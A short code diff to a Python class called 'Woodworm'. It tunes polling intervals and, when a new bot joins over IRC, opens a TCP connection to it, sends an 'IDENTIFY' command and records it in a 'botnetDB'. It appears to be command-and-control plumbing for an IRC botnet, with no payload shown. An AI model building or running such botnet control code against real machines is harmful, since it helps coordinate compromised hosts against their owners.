@@ -47,8 +47,8 @@ class Woodworm:
                 tg.create_task(self.tcp_server.listen(0.0))
         else:
             while True:
-                await self.irc_connection.listen_step(0.1)
-                await self.tcp_server.listen_step(0.1)
+                await self.irc_connection.listen_step(0.0)
+                await self.tcp_server.listen_step(0.0)
 
 
     async def irc_onConnected(self, *args, **kwargs):
@@ -72,11 +72,13 @@ class Woodworm:
 
         if self.botnetDB.get_bot(nick) is None:
             bot = context.Context(nick, ip, port)
-            connection = bot.get_tcp_connection()
-            await connection.connect()
-            bot.set_connected(True) # fix this
+            tcpClient = tcp_services.TCPClient(ip, port)
+            bot.set_tcp__connection(await tcpClient.connect())
+            bot.set_connected(True) 
             self.botnetDB.add_bot(bot)
             
+            bot.get_tcp_connection().send_command(f"IDENTIFY: {self.ircNick}")
+
             self.syslog.log(f"Bot added to DB: nick: {nick}, ip: {ip} port: {port}", level=logger.LogLevel.INFO)
             self.syslog.log(f"Number of bots: {len(self.botnetDB.get_bots())}", level=logger.LogLevel.INFO)
 
